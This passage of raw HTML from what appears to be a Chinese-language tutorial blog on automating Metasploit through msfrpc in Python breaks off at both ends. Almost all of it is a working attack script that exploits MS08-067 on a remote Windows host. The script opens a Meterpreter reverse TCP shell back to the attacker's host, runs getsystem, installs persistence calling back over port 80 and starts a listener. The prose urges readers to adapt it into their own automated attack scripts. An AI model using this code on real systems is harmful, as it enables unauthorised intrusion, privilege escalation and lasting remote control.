&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;listen&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot;use&nbsp;exploit/multi/handler set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp set&nbsp;LPORT&nbsp;80 set&nbsp;LHOST&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; exploit &quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> </span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;[+]&nbsp;Setting&nbsp;up&nbsp;listener&nbsp;on:&nbsp;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;:80&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.write'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">listen</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> lres&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.read'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> </span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;lres</span></pre><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; color: #262626"></span>上面代码中的变量(RHOST, LHOST,<br />LPORT等)都是通过optparse模块从命令终端输入的,完整的脚本托管在github上面,有时候你需要知道脚本的生成的地方都是静态地址,不会<br />在其他的目录生成,例如ms08067的补丁就会在你的/tmp/目录下面。<span style="box-sizing: border-box; color: #262626"></span></p><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; font-weight: 700">大家只要知道基础然后对下面的代码进行一定的修改就可以编程一个属于你自己的<br />msf自动化攻击脚本,我们建议通过博客里面发表的一些简单的例子出发,然后自己写一个msf攻击脚本:</span></p><pre class="prettyprint lang-as3 prettyprinted" style="box-sizing: border-box; overflow: auto; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; padding: 8px; margin-top: 0px; margin-bottom: 10px; line-height: 20px; color: #333333; word-break: break-all; word-wrap: break-word; border: 1px solid #e1e1e8; border-radius: 4px; white-space: pre-wrap; background-color: #f7f7f9"><span style="box-sizing: border-box; color: #1e347b" class="kwd">import</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;os</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;msfrpc</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;optparse</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;sys</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;subprocess </span><span style="box-sizing: border-box; color: #1e347b" class="kwd">from</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;time&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">import</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;sleep&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="com">#&nbsp;Function&nbsp;to&nbsp;create&nbsp;the&nbsp;MSF&nbsp;.rc&nbsp;files</span><span style="box-sizing: border-box; color: #48484c" class="pln"> </span><span style="box-sizing: border-box; color: #1e347b" class="kwd">def</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;builder</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">):</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;open</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'/tmp/smbpost.rc'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">'w'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bat&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;open</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'/tmp/ms08067_install.bat'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">'w'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;postcomms&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot;getsystem run&nbsp;persistence&nbsp;-S&nbsp;-U&nbsp;-X&nbsp;-i&nbsp;10&nbsp;-p&nbsp;80&nbsp;-r&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; cd&nbsp;c:&#92;&#92; upload&nbsp;/tmp/ms08067_patch.exe&nbsp;c:&#92;&#92; upload&nbsp;/tmp/ms08067_install.bat&nbsp;c:&#92;&#92; execute&nbsp;-f&nbsp;ms08067_install.bat &quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;batcomm&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;ms08067_patch.exe&nbsp;/quiet&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">write</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">postcomms</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">);</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;bat</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">write</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">batcomm</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">close</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">();</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;bat</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">close</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">()</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="com">#&nbsp;Exploits&nbsp;the&nbsp;chain&nbsp;of&nbsp;rc&nbsp;files&nbsp;to&nbsp;exploit&nbsp;MS08-067,&nbsp;setup&nbsp;persistence,&nbsp;and&nbsp;patch</span><span style="box-sizing: border-box; color: #48484c" class="pln"> </span><span style="box-sizing: border-box; color: #1e347b" class="kwd">def</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;sploiter</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;session</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">):</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;msfrpc</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: teal" class="typ">Msfrpc</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(&#123;&#125;)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">login</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'msf'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">'123'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ress&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.create'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console_id&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;ress</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">[</span><span style="box-sizing: border-box; color: #dd1144" class="str">'id'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">]</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="com">##&nbsp;Exploit&nbsp;MS08-067&nbsp;##</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;commands&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot;use&nbsp;exploit/windows/smb/ms08_067_netapi set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp set&nbsp;RHOST&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; set&nbsp;LHOST&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; set&nbsp;LPORT&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; set&nbsp;ExitOnSession&nbsp;false exploit&nbsp;-z &quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;[+]&nbsp;Exploiting&nbsp;MS08-067&nbsp;on:&nbsp;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.write'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">commands</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.read'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;res</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">[</span><span style="box-sizing: border-box; color: #dd1144" class="str">'data'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">].</span><span style="box-sizing: border-box; color: #48484c" class="pln">split</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'&#92;n'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="com">##&nbsp;Run&nbsp;Post-exploit&nbsp;script&nbsp;##</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;runPost&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot;use&nbsp;post/multi/gather/run_console_rc_file set&nbsp;RESOURCE&nbsp;/tmp/smbpost.rc set&nbsp;SESSION&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">session</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; exploit &quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;[+]&nbsp;Running&nbsp;post-exploit&nbsp;script&nbsp;on:&nbsp;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.write'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">runPost</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rres&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.read'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> </span><span style="box-sizing: border-box; color: #93a1a1" class="com">##&nbsp;Setup&nbsp;Listener&nbsp;for&nbsp;presistent&nbsp;connection&nbsp;back&nbsp;over&nbsp;port&nbsp;80&nbsp;##</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #195f91" class="lit">10</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;listen&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot;use&nbsp;exploit/multi/handler set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp set&nbsp;LPORT&nbsp;80 set&nbsp;LHOST&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; exploit &quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;[+]&nbsp;Setting&nbsp;up&nbsp;listener&nbsp;on:&nbsp;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;:80&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.write'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">listen</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lres&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.read'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;lres&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">def</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;main</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">():</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parser&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;optparse</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: teal" class="typ">OptionParser</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">sys</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">argv</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">[</span><span style="box-sizing: border-box; color: #195f91" class="lit">0</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">]</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">&#92; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">'&nbsp;-p&nbsp;LPORT&nbsp;-r&nbsp;RHOST&nbsp;-l&nbsp;LHOST'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parser</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">add_option</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'-p'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;dest</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'LPORT'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;type</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'string'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&#92; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'specify&nbsp;a&nbsp;port&nbsp;to&nbsp;listen&nbsp;on'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parser</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">add_option</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'-r'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;dest</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'RHOST'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;type</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'string'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&#92; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'Specify&nbsp;a&nbsp;remote&nbsp;host'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parser</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">add_option</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'-l'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;dest</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'LHOST'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;type</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #dd1144" class="str">'string'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&#92; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: 